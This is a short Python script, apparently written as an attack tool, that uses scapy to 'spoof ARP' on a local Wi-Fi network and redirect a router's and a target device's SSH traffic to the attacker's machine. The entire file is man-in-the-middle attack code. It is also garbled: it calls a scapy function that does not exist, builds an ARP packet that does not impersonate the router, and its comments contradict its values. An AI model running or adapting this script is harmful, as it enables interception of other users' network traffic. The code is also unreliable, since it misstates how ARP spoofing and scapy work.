import scapy.all as scapy
import netifaces as ni

# Set the original router's IP address and MAC address
original_router_ip = "192.168.1.1"
original_router_mac = "00:11:22:33:44:55"

# Set your Parrot OS device's IP address and MAC address
your_device_ip = "192.168.1.100"
your_device_mac = "aa:bb:cc:dd:ee:ff"

# Set the port to forward (e.g., TCP 80 for HTTP)
port_to_forward = 8080

# Set the target device's IP address and port
target_device_ip = "192.168.1.2"
target_device_port = 22


def spoof_arp():
    # Create an ARP packet with your Parrot OS device as the source
    arp_packet = scapy.ARP(op=1, psrc=your_device_ip, pdst=original_router_ip)

    # Send the ARP packet to the original router
    scapy.sendp(arp_packet, iface="wlan0")


def forward_traffic():
    # Create a forwarding rule to redirect traffic from the original router's IP address and port to your device
    rules = [
        {"protocol": "tcp", "src_ip": original_router_ip, "dst_port": port_to_forward},
        {"protocol": "tcp", "src_ip": target_device_ip, "dst_port": target_device_port}
    ]

    # Set up the forwarding rule using `scapy`
    for rule in rules:
        scapy.set_filter(f"tcp src {rule['src_ip']} and dstport {rule['dst_port']}")


def main():
    # Perform ARP spoofing
    print("Spoofing ARP...")
    spoof_arp()

    # Set up port forwarding
    print("Setting up port forwarding...")
    forward_traffic()


if __name__ == "__main__":
    main()
